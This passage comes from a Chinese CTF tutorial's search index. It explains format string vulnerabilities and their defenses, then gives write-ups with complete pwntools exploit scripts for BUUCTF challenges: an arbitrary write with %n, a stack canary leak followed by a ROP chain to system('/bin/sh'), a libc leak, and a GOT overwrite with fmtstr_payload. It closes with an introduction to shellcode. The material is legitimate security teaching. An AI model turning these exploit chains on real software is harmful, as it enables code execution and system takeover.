\u683c\u5f0f\u5316\u7b26\u53f7\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u5199\u5165\u6808\u4e0a\u7684\u6570\u636e</p> <p><code>%n</code> \u4f1a\u5c06\u5f53\u524d\u8f93\u51fa\u7684\u5b57\u7b26\u6570\uff08\u5373\u5df2\u7ecf\u6253\u5370\u7684\u5b57\u7b26\u6570\uff09\u5199\u5165\u4e00\u4e2a\u6307\u5b9a\u7684\u5185\u5b58\u4f4d\u7f6e\u5047\u8bbe\u7a0b\u5e8f\u5982\u4e0b\uff1a</p> <pre><code>printf(user_input);  // user_input\u4e2d\u5305\u542b\"%n\"\n</code></pre> <p>\u5982\u679c <code>user_input</code> \u5305\u542b <code>%n</code>\uff0c\u5219\u7a0b\u5e8f\u4f1a\u5c1d\u8bd5\u5c06\u5f53\u524d\u5df2\u7ecf\u8f93\u51fa\u7684\u5b57\u7b26\u6570\u5199\u5165\u4e00\u4e2a\u6307\u5b9a\u7684\u5185\u5b58\u5730\u5740</p> <p>\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236\u8fd9\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u4fbf\u6709\u53ef\u80fd\u4fee\u6539\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u3001\u51fd\u6570\u6307\u9488\u7b49\u5173\u952e\u6570\u636e\uff0c\u4ece\u800c\u5b9e\u73b0\u4ee3\u7801\u6ce8\u5165\u6216\u8df3\u8f6c\u6267\u884c\u4efb\u610f\u4ee3\u7801</p>"},{"location":"Pwn/Chapter2/#\u8986\u76d6\u8fd4\u56de\u5730\u5740return-address-overwrite","title":"\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff08Return Address Overwrite\uff09","text":"<p>\u901a\u8fc7\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u6808\u4e0a\u8986\u76d6\u8fd4\u56de\u5730\u5740</p> <p>\u5047\u8bbe\u7a0b\u5e8f\u6808\u7ed3\u6784\u5982\u4e0b\uff1a</p> <ul> <li>\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4f1a\u88ab\u4fdd\u5b58\u5728\u6808\u4e0a</li> <li>\u5f53\u51fd\u6570\u8fd4\u56de\u65f6\uff0c\u8fd4\u56de\u5730\u5740\u4f1a\u88ab\u7528\u6765\u8df3\u8f6c\u5230\u51fd\u6570\u8c03\u7528\u5904</li> </ul> <p>\u5982\u679c\u653b\u51fb\u8005\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6210\u529f\u8986\u76d6\u4e86\u8fd4\u56de\u5730\u5740\uff0c\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u6267\u884c\u653b\u51fb\u8005\u6307\u5b9a\u7684\u6076\u610f\u4ee3\u7801</p>"},{"location":"Pwn/Chapter2/#\u6f0f\u6d1e\u793a\u4f8b","title":"\u6f0f\u6d1e\u793a\u4f8b","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function(char *user_input) {\n    char buffer[100];\n    strcpy(buffer, user_input);  // \u8fd9\u91cc\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684strcpy\n    printf(buffer);  // \u4f7f\u7528\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n}\n\nint main() {\n    char user_input[200];\n    fgets(user_input, 200, stdin);  // \u4ece\u7528\u6237\u8bfb\u53d6\u8f93\u5165\n    vulnerable_function(user_input);\n    return 0;\n}\n</code></pre> <p>\u5728\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c<code>vulnerable_function</code> \u4f7f\u7528\u4e86 <code>strcpy</code> \u6765\u5c06\u7528\u6237\u8f93\u5165\u590d\u5236\u5230 <code>buffer</code> \u4e2d\uff0c\u7136\u540e\u9519\u8bef\u5730\u4f7f\u7528 <code>printf</code> \u8f93\u51fa\u4e86 <code>buffer</code></p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5728\u8f93\u5165\u4e2d\u52a0\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff08\u4f8b\u5982 <code>%x %x %x %x</code>\uff09\u6765\u6cc4\u9732\u6808\u4fe1\u606f\uff0c\u6216\u901a\u8fc7 <code>%n</code> \u6765\u4fee\u6539\u6808\u4e0a\u7684\u503c</p>"},{"location":"Pwn/Chapter2/#\u653b\u51fb\u6b65\u9aa4","title":"\u653b\u51fb\u6b65\u9aa4","text":"<ol> <li>\u4fe1\u606f\u6cc4\u9732\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u5305\u542b <code>%x</code>\u3001<code>%p</code> \u7b49\u683c\u5f0f\u5316\u7b26\u53f7\u7684\u5b57\u7b26\u4e32\uff0c\u6cc4\u9732\u7a0b\u5e8f\u6808\u4e0a\u7684\u5185\u5bb9</li> <li>\u8986\u76d6\u5185\u5b58\uff1a\u4f7f\u7528 <code>%n</code> \u53ef\u4ee5\u5c06\u8f93\u51fa\u7684\u5b57\u7b26\u6570\u5199\u5165\u4e00\u4e2a\u6307\u5b9a\u7684\u5185\u5b58\u4f4d\u7f6e</li> <li>\u5229\u7528\u63a7\u5236\u6d41\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u8fd4\u56de\u5730\u5740\uff0c\u5c06\u5176\u6307\u5411\u6076\u610f\u4ee3\u7801\u7684\u5730\u5740\uff08\u5982\u6808\u4e0a\u7684 shellcode\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u4ee3\u7801\u6267\u884c</li> </ol>"},{"location":"Pwn/Chapter2/#\u9632\u5fa1\u63aa\u65bd","title":"\u9632\u5fa1\u63aa\u65bd","text":"<p>\u4e3a\u4e86\u9632\u6b62\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u91c7\u53d6\u4ee5\u4e0b\u63aa\u65bd\uff1a</p> <ol> <li>\u907f\u514d\u76f4\u63a5\u4f7f\u7528\u7528\u6237\u8f93\u5165\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a\u59cb\u7ec8\u786e\u4fdd\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u7531\u56fa\u5b9a\u683c\u5f0f\u7ec4\u6210\uff0c\u907f\u514d\u76f4\u63a5\u4f7f\u7528 <code>user_input</code> \u4f5c\u4e3a\u683c\u5f0f\u5b57\u7b26\u4e32</li> </ol> <pre><code>printf(\"%s\", user_input);  // \u907f\u514d\u76f4\u63a5\u5c06user_input\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n</code></pre> <ol> <li>\u4f7f\u7528\u5b89\u5168\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u51fd\u6570\uff1a\u4f8b\u5982\u4f7f\u7528 <code>snprintf</code> \u66ff\u4ee3 <code>sprintf</code>\uff0c\u5e76\u4e14\u5728\u5904\u7406\u5b57\u7b26\u4e32\u65f6\u786e\u4fdd\u4e0d\u4f1a\u6ea2\u51fa\u7f13\u51b2\u533a</li> </ol> <pre><code>snprintf(buffer, sizeof(buffer), \"%s\", user_input);\n</code></pre> <ol> <li> <p>\u542f\u7528\u6808\u4fdd\u62a4\uff08Stack Canaries\uff09\uff1a\u73b0\u4ee3\u7f16\u8bd1\u5668\u652f\u6301\u6808\u4fdd\u62a4\uff08\u5982 GCC \u7684 <code>-fstack-protector</code>\uff09\uff0c\u53ef\u4ee5\u68c0\u6d4b\u6808\u6ea2\u51fa\u5e76\u9632\u6b62\u8986\u76d6\u8fd4\u56de\u5730\u5740</p> </li> <li> <p>\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff08ASLR\uff09\uff1a\u542f\u7528 ASLR \u53ef\u4ee5\u589e\u52a0\u653b\u51fb\u8005\u9884\u6d4b\u5185\u5b58\u5730\u5740\u7684\u96be\u5ea6\uff0c\u4ece\u800c\u51cf\u5c0f\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u98ce\u9669</p> </li> <li> <p>\u63a7\u5236\u6d41\u5b8c\u6574\u6027\uff08CFI\uff09\uff1a\u542f\u7528 CFI \u53ef\u4ee5\u9632\u6b62\u653b\u51fb\u8005\u901a\u8fc7\u4fee\u6539\u8fd4\u56de\u5730\u5740\u6216\u51fd\u6570\u6307\u9488\u6765\u52ab\u6301\u7a0b\u5e8f\u63a7\u5236\u6d41</p> </li> </ol>"},{"location":"Pwn/Chapter2/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u5185\u5b58\u7ba1\u7406\u9519\u8bef\uff0c\u53ef\u4ee5\u5bfc\u81f4\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u751a\u81f3\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7406\u89e3\u5e76\u907f\u514d\u8fd9\u79cd\u6f0f\u6d1e\u7684\u6839\u6e90\u2014\u2014\u4e0d\u5b89\u5168\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4f7f\u7528\uff0c\u662f\u4fdd\u62a4\u7a0b\u5e8f\u5b89\u5168\u7684\u4e00\u4e2a\u5173\u952e\u6b65\u9aa4</p>"},{"location":"Pwn/Chapter2/2-1/","title":"Printf \u6307\u5b9a\u5730\u5740\u4fee\u6539","text":""},{"location":"Pwn/Chapter2/2-1/#printf-\u6307\u5b9a\u5730\u5740\u4fee\u6539","title":"Printf \u6307\u5b9a\u5730\u5740\u4fee\u6539","text":"<p>dword_804C044 \u662f\u4e00\u4e2a\u7cfb\u7edf\u4ea7\u751f\u7684\u968f\u673a\u6570\uff0c\u9700\u8981\u6211\u4eec\u8f93\u5165\u7684 passwd \u7b49\u4e8e\u8fd9\u4e2a\u968f\u673a\u6570</p> <p></p> <p>Printf \u5b58\u5728\u683c\u5f0f\u5316\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 %p \u6253\u5370\u5730\u5740</p> <p>\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u8f93\u5165\u7684\u503c\u5728 10 \u4e2a\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u7528 %10$ \u5b9a\u4f4d\u5230\u8fd9\u4e2a\u4f4d\u7f6e</p> <p></p> <p>\u518d\u6765\u770b\u770b\u968f\u673a\u6570\u5730\u5740</p> <p></p> <pre><code>%n$x\uff1a\uff08n \u4e3a\u67d0\u4e00\u6570\u503c\uff0cx \u4e3a\u67d0\u4e2a\u5360\u4f4d\u7b26\uff09\u53ef\u4ee5\u5bf9\u6808\u4e0a\u7b2c n \u4e2a\u53c2\u6570\u8fdb\u884c\u76f8\u5e94\u5360\u4f4d\u7b26\u7684\u64cd\u4f5c\n%x\u3001%p\uff1a\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u540e\u8005\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u533a\u522b\n%s\uff1a\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5bb9\uff0c\u6ce8\u610f\u6709\u96f6\u622a\u65ad\n%n\uff1a\u53ef\u4ee5\u5c06\u5bf9\u5e94\u6808\u4e0a\u7684\u6307\u9488\u6307\u5411\u7684\u5185\u5b58\u5185\u5bb9\u4fee\u6539\u4e3a\u5728\u5b83\u4e4b\u524d\u8f93\u5165\u7684\u5b57\u7b26\u6570\u91cf\n</code></pre> <p>\u5728 32 \u4f4d\u4e2d\u5730\u5740\u957f\u5ea6\u662f 4 \u4f4d</p> <p></p> <p>\u6240\u4ee5\u6700\u540e\u4f20\u5165 4 \u5373\u53ef</p> <pre><code>from pwn import *\n\np=remote('node5.buuoj.cn',26088)\n\np.recvuntil('name:')\n\npayload = p32(0x0804c044) + b'%10$n'\n\np.sendline(payload)\n\np.recvuntil('passwd:')\np.sendline(str(4))\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter2/2-2/","title":"Printf \u6307\u5b9a\u5730\u5740\u6cc4\u9732 Canary","text":""},{"location":"Pwn/Chapter2/2-2/#printf-\u6307\u5b9a\u5730\u5740\u6cc4\u9732-canary","title":"Printf \u6307\u5b9a\u5730\u5740\u6cc4\u9732 Canary","text":"<p>\u5148 checksec \u4e00\u4e0b\u53d1\u73b0\u5f00\u542f\u4e86 Canary \u53ca NX</p> <p></p> <p>\u53cd\u7f16\u8bd1\u5148\u770b main \u51fd\u6570</p> <p></p> <p>\u9996\u5148\u8c03\u7528\u4e86 init \u51fd\u6570\u6253\u5370\u4e86\u4e24\u53e5\u8bdd</p> <p></p> <p>\u518d\u662f gift \u51fd\u6570\uff0c\u8fd9\u91cc\u660e\u663e\u5b58\u5728\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u6f0f\u6d1e</p> <p></p> <p>\u6700\u540e\u662f vuln \u51fd\u6570</p> <p></p> <p>buf \u7f13\u51b2\u533a\u5b58\u5728\u6ea2\u51fa</p> <p></p> <p>\u5c1d\u8bd5\u5e38\u89c4\u65b9\u6cd5\u6cc4\u9732\u4f46\u4e0d\u884c</p> <p></p> <p>\u8f93\u5165 %n$p\uff08\u7528\u6cd5\u53c2\u8003 2.1\uff09</p> <p>\u53ef\u4ee5\u770b\u5230\u504f\u79fb\u662f 6</p> <p></p> <p>\u4f7f\u7528 gdb \u8c03\u8bd5\u53d1\u73b0\u5728\u5b57\u7b26\u4e32\u4e0b\u9762\u4e00\u884c\u5c31\u662f Canary \u7684\u503c</p> <p></p> <p>\u6240\u4ee5\u8f93\u5165 %7$p \u5c31\u80fd\u6cc4\u9732 Canary \u7684\u503c</p> <p></p> <p></p> <p>64 \u4f4d\u7cfb\u7edf\u8fd8\u9700\u8981\u4e00\u4e2a pop rdi;ret</p> <p></p> <p>Canary \u4fdd\u62a4\u4f1a\u4ece rbp-4 \u6216\u8005 rbp-8 \u7684\u4f4d\u7f6e\u53d6\u51fa\u5e76\u4e0e fs/gs \u5bc4\u5b58\u5668\u5bf9\u5e94\u4f4d\u7f6e\u7684\u503c\u8fdb\u884c\u6bd4\u8f83</p> <p>\u5982\u679c\u4e0d\u76f8\u7b49\u5c31\u4f1a\u6267\u884c __ stack_chk_fail \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5f3a\u884c\u505c\u6b62\u7a0b\u5e8f\u8fd0\u884c\u5e76\u53d1\u51fa\u8b66\u544a\uff0c\u4ece\u800c\u963b\u6b62\u6808\u6ea2\u51fa\u653b\u51fb</p> <p>\u6240\u4ee5\u5728\u6700\u540e\u586b\u4e0a Canary \u7684\u503c\u6765\u7ed5\u8fc7</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nr = remote('node3.buuoj.cn',26842)\nelf = ELF('./bjdctf_2020_babyrop2')\n\npayload = '%7$p'\n\nr.sendline(payload)\nr.recvuntil('0x')\n\ncancry = int(r.recv(16),16)\n\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x0400993\nmain_addr = elf.symbols['main']\nvuln_addr = 0x0400887\n\n# 'a' * (0x20 - 8) + p64(cancry)\uff1a\u7ed5\u8fc7 cancry\n# p64(0)\uff1a\u8986\u76d6 ebp\npayload = b'a' * (0x20 - 8) + p64(cancry) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)\n\nr.recvuntil('story!\\n')\nr.sendline(payload)\n\nputs_addr = u64(r.recv(6).ljust(8, b'\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nbase_addr = puts_addr - libc.dump('puts')\nsystem_addr = base_addr + libc.dump('system')\nshell_addr = base_addr + libc.dump('str_bin_sh')\n\nr.recvuntil('story!\\n')\n\npayload = b'a' * (0x20 - 8) + p64(cancry) + p64(0) + p64(pop_rdi) + p64(shell_addr) + p64(system_addr) + p64(main_addr)\n\nr.sendline(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter2/2-3/","title":"Printf \u6307\u5b9a\u5730\u5740\u6cc4\u9732 libc","text":""},{"location":"Pwn/Chapter2/2-3/#printf-\u6307\u5b9a\u5730\u5740\u6cc4\u9732-libc","title":"Printf \u6307\u5b9a\u5730\u5740\u6cc4\u9732 libc","text":"<p>\u5728\u7b2c 25 \u884c\u660e\u663e\u5b58\u5728\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</p> <p></p> <p>\u9996\u5148\u8c03\u8bd5\u7a0b\u5e8f\u627e\u627e\u504f\u79fb</p> <p>\u53ef\u4ee5\u770b\u5230\u504f\u79fb\u662f 8\uff0c\u4f46\u662f\u6ca1\u6709\u8865\u5168</p> <p></p> <p>\u524d\u9762\u8fd8\u8981\u52a0\u4e2a\u5b57\u7b26\u8865\u5168\u624d\u662f</p> <p></p> <p>\u7531\u6b64\u53ef\u4ee5\u6cc4\u9732 libc \u7248\u672c</p> <pre><code># 'A'  \u662f\u7528\u6765\u8865\u4f4d\u7684\uff0c\u8fd9\u6837\u540e\u9762\u7684 printf \u51fd\u6570\u7684 got \u8868\u5730\u5740\u5c31\u4f1a\u5728\u6808\u4e0a\u76f8\u5bf9\u8ddd\u79bb\u4e3a 8 \u7684\u4f4d\u7f6e\n# %8$s  \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 %8$s \u53bb\u6cc4\u9732\u51fa\u6808\u4e0a\u76f8\u5bf9\u8ddd\u79bb\u4e3a 8 \u7684\u5730\u5740\u4e0a\u7684\u503c\n# 'B'  \u76f8\u5f53\u4e8e\u6807\u8bb0\u4f4d\uff0c\u4e0b\u9762\u5728\u63a5\u6536\u6570\u636e\u7684\u65f6\u5019\uff0c\u63a5\u6536\u5230\u5b57\u7b26 'B',\u540e\u9762\u8ddf\u7740\u7684\u5c31\u662f\u6211\u4eec\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\u5730\u5740\npayload = b'A' + p32(printf_got)+ b'B' + b'%8$s'\n</code></pre> <p>\u5b8c\u6574 payload \u5982\u4e0b\uff08\u540e\u7eed getshell \u90e8\u5206\u53c2\u8003 2.4\uff09</p> <pre><code>payload = b'A' + p32(printf_got)+ b'B' + b'%8$s'\n\np.sendafter(\"Please tell me:\", payload)\n\np.recvuntil('B')\nprintf_addr = u32(r.recv(4))\n\nlibc = LibcSearcher('printf', printf_addr)\nlibc_base = printf_addr - libc.dump('printf') \nsystem = libc_base + libc.dump('system')\n</code></pre>"},{"location":"Pwn/Chapter2/2-4/","title":"Fmtstr_payload \u83b7\u53d6 shell","text":""},{"location":"Pwn/Chapter2/2-4/#fmtstr_payload-\u83b7\u53d6-shell","title":"Fmtstr_payload \u83b7\u53d6 shell","text":"<p>\u7ee7\u4e0a\u4e00\u8282\u62ff\u5230\u83b7\u53d6\u5230 libc \u7248\u672c\u540e</p> <p>\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7 pwntools \u7684 fmtstr_payload \u529f\u80fd\u6765\u7b80\u5316\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528</p> <p>\u4e0d\u7528\u518d\u81ea\u5df1\u4e00\u70b9\u4e00\u70b9\u5c0f\u5fc3\u5730\u6784\u9020 payload\uff0c\u800c\u4ea4\u7ed9 pwntools \u6765\u81ea\u52a8\u5b8c\u6210</p> <pre><code>// \u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\n// \u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u9700\u8981\u5229\u7528 %n \u5199\u5165\u7684\u6570\u636e\uff0c\u91c7\u7528\u5b57\u5178\u5f62\u5f0f\uff0c\u6211\u4eec\u8981\u5c06 printf \u7684 GOT \u6570\u636e\u6539\u4e3a system \u51fd\u6570\u5730\u5740\uff0c\u5c31\u5199\u6210 {printf_GOT: systemAddress}\n// \u7b2c\u4e09\u4e2a\u53c2\u6570\u8868\u793a\u5df2\u7ecf\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\uff0c\u4e3a 0\uff0c\u91c7\u7528\u9ed8\u8ba4\u503c\u5373\u53ef\n// \u7b2c\u56db\u4e2a\u53c2\u6570\u8868\u793a\u5199\u5165\u65b9\u5f0f\uff0c\u662f\u6309\u5b57\u8282\uff08byte\uff09\u3001\u6309\u53cc\u5b57\u8282\uff08short\uff09\u8fd8\u662f\u6309\u56db\u5b57\u8282\uff08int\uff09\uff0c\u5bf9\u5e94\u7740 hhn\u3001hn \u548c n\uff0c\u9ed8\u8ba4\u503c\u662f byte\uff0c\u5373\u6309 hhn \u5199\nfmtstr_payload(offset, writes, numbwritten=0, write_size='byte')\n</code></pre> <p>\u6784\u9020 payload</p> <pre><code>payload = b'a' + fmtstr_payload(8,{printf_got:system},write_size=\"byte\",numbwritten=0xa)\n</code></pre> <p>payload \u53c2\u8003\u539f\u56e0\uff1a0xa = 1\uff08payload \u524d\u9762\u7684 a\uff09+ 9\uff08payload \u957f\u5ea6\uff09</p> <p></p> <p>\u4e4b\u540e\u4f20\u5165 \";/bin/sh\\x00\" \u5373\u53ef\u4ee5\u83b7\u53d6 shell</p> <p><code>;</code> \u662f shell \u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\u5206\u9694\u7b26\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u5206\u9694\u4e24\u6761\u547d\u4ee4\uff0c\u5141\u8bb8\u5728\u4e00\u884c\u4e2d\u6267\u884c\u591a\u4e2a\u547d\u4ee4</p> <p><code>;</code> \u662f\u4e3a\u4e86\u786e\u4fdd\u65e0\u8bba\u76ee\u6807\u7a0b\u5e8f\u5982\u4f55\u8c03\u7528 <code>printf</code>\uff0c<code>/bin/sh</code> \u90fd\u80fd\u88ab\u6b63\u786e\u6267\u884c</p> <p><code>\\x00</code> \u662f\u4e3a\u4e86\u786e\u4fdd\u5b57\u7b26\u4e32\u88ab\u6b63\u786e\u622a\u65ad\uff0c\u907f\u514d\u540e\u7eed\u6570\u636e\u5e72\u6270</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\ncontext(os='linux',arch='i386')\n\nr = remote(\"node5.buuoj.cn\",\"25268\")\nelf = ELF(\"./axb_2019_fmt32\")\n\nprintf_got = elf.got['printf']\n\npayload = b'a' + p32(printf_got) + b'B'+ b'%8$s'\nr.sendafter('me:', payload)\nr.recvuntil(\"B\")\nprintf_addr = u32(r.recv(4))\n\nlibc = LibcSearcher('printf',printf_addr)\nlibc_base = printf_addr - libc.dump('printf')\nsystem = libc_base + libc.dump('system')\n\npayload = b'a' + fmtstr_payload(8,{printf_got:system},numbwritten = 0xa)\n\nr.sendline(payload)\nr.sendline(';/bin/sh\\x00')\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter3/","title":"Index","text":""},{"location":"Pwn/Chapter3/#shellcode-\u7684\u6982\u5ff5","title":"Shellcode \u7684\u6982\u5ff5","text":""},{"location":"Pwn/Chapter3/#shellcode-\u7684\u5de5\u4f5c\u539f\u7406","title":"Shellcode \u7684\u5de5\u4f5c\u539f\u7406","text":"<p>\u901a\u5e38\uff0c\u653b\u51fb\u8005\u4f1a\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u7684\u57fa\u7840\u4e0a\uff0c\u5411\u5806\u6808\u4e2d\u6ce8\u5165 shellcode</p> <p>\u7136\u540e\uff0c\u653b\u51fb\u8005\u4f1a\u5229\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u6765\u8986\u76d6\u7a0b\u5e8f\u63a7\u5236\u6d41\uff08\u5982\u8fd4\u56de\u5730\u5740\uff09\uff0c\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u8df3\u8f6c\u5230 shellcode \u7684\u4f4d\u7f6e\uff0c\u6700\u7ec8\u6267\u884c shellcode \u4e2d\u7684\u6076\u610f\u547d\u4ee4</p>"},{"location":"Pwn/Chapter3/#shellcode-\u7684\u79cd\u7c7b","title":"Shellcode \u7684\u79cd\u7c7b","text":"<p>\u6839\u636e\u6267\u884c\u76ee\u6807\u548c\u9700\u6c42\uff0cshellcode \u53ef\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\u7c7b\u578b\uff1a</p>"},{"location":"Pwn/Chapter3/#\u672c\u5730-shellcode","title":"\u672c\u5730 Shellcode","text":"<ul> <li>\u529f\u80fd\uff1a\u901a\u5e38\u662f\u83b7\u53d6\u4e00\u4e2a\u672c\u5730 shell\uff0c\u4f8b\u5982 <code>/bin/sh</code></li> <li>\u6267\u884c\uff1a\u653b\u51fb\u8005\u7684 shellcode \u4f1a\u542f\u52a8\u4e00\u4e2a shell \u5e76\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u653b\u51fb\u8005</li> </ul>"},{"location":"Pwn/Chapter3/#\u53cd\u5411-shellcodereverse-shell","title":"\u53cd\u5411 Shellcode\uff08Reverse Shell\uff09","text":"<ul> <li>\u529f\u80fd\uff1a\u8fde\u63a5\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u8fdc\u7a0b\u4e3b\u673a</li> <li>\u6267\u884c\uff1a\u53cd\u5411 shellcode \u4f1a\u6253\u5f00\u4e00\u4e2a socket \u8fde\u63a5\u5230\u653b\u51fb\u8005\u7684 IP \u5730\u5740\u548c\u7aef\u53e3\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8be5\u8fde\u63a5\u63a7\u5236\u76ee\u6807\u4e3b\u673a</li> </ul>"},{"location":"Pwn/Chapter3/#bind-shellcode","title":"Bind Shellcode","text":"<ul> <li>\u529f\u80fd\uff1a\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6253\u5f00\u4e00\u4e2a\u7aef\u53e3\uff0c\u7b49\u5f85\u653b\u51fb\u8005\u7684\u8fde\u63a5</li> <li>\u6267\u884c\uff1a\u4e0d\u540c\u4e8e\u53cd\u5411 shellcode\uff0cbind shellcode \u4f1a\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u7ed1\u5b9a\u4e00\u4e2a\u7aef\u53e3\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fde\u63a5\u5230\u8be5\u7aef\u53e3\u6765\u83b7\u5f97\u76ee\u6807\u7cfb\u7edf\u7684\u63a7\u5236\u6743</li> </ul>"},{"location":"Pwn/Chapter3/#nop-sled-\u548c-egg-hunter","title":"NOP sled \u548c Egg Hunter","text":"<ul> <li>NOP sled\uff1a\u4e3a\u4e86\u786e\u4fdd shellcode \u6267\u884c\u5f97\u66f4\u52a0\u7a33\u5b9a\uff0c\u653b\u51fb\u8005\u4f1a\u5728 shellcode \u524d\u9762\u63d2\u5165\u4e00\u5927\u6bb5 <code>NOP</code>\uff08\u65e0\u64cd\u4f5c\u6307\u4ee4\uff0c\u901a\u5e38\u662f <code>0x90</code>\uff09\uff0c\u8fd9\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6ea2\u51fa\u65f6\u53ef\u4ee5\u8df3\u8f6c\u5230\u8fd9\u6bb5 NOP sled \u533a\u57df\uff0c\u5e76\u4e14\u4e0d\u5bb9\u6613\u5931\u8bef\u5730\u8df3\u8f6c\u5230\u9519\u8bef\u7684\u4f4d\u7f6e</li> <li>Egg Hunter\uff1a\u5982\u679c shellcode \u5f88\u5927\uff0c\u8d85\u51fa\u4e86\u7f13\u51b2\u533a\u7684\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u201cegg hunter\u201d\u6280\u672f\uff0cegg hunter \u662f\u4e00\u6bb5\u975e\u5e38\u5c0f\u7684 shellcode\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u626b\u63cf\u5185\u5b58\u5e76\u5bfb\u627e\u653b\u51fb\u8005\u4e8b\u5148\u5199\u5165\u5185\u5b58\u4e2d\u7684\u7279\u5b9a\u6807\u8bb0\uff08\u901a\u5e38\u53eb\u505a \"egg\"\uff09\uff0c\u7136\u540e\u6267\u884c\u6807\u8bb0\u540e\u7684 shellcode</li> </ul>"},{"location":"Pwn/Chapter3/#shellcode-\u7684\u5b9e\u73b0","title":"Shellcode \u7684\u5b9e\u73b0","text":"<p>Shellcode \u662f\u7528\u6c47\u7f16\u8bed\u8a00\u7f16\u5199\u7684\uff0c\u901a\u5e38\u9700\u8981\u6267\u884c\u7279\u5b9a\u7684\u7cfb\u7edf\u8c03\u7528</p> <p>\u4f8b\u5982\uff0cLinux \u4e0a\u7684 shellcode \u53ef\u80fd\u4f1a\u7528\u5230 <code>execve()</code> \u7cfb\u7edf\u8c03\u7528\u6765\u6267\u884c\u547d\u4ee4</p> <p>\u4e3a\u4e86\u751f\u6210\u6709\u6548\u7684 shellcode\uff0c\u653b\u51fb\u8005\u9700\u8981\uff1a</p> <ul> <li>\u7f16\u5199\u6c47\u7f16\u4ee3\u7801\uff0c\u786e\u4fdd\u5b83\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u7279\u5b9a\u4efb\u52a1</li> 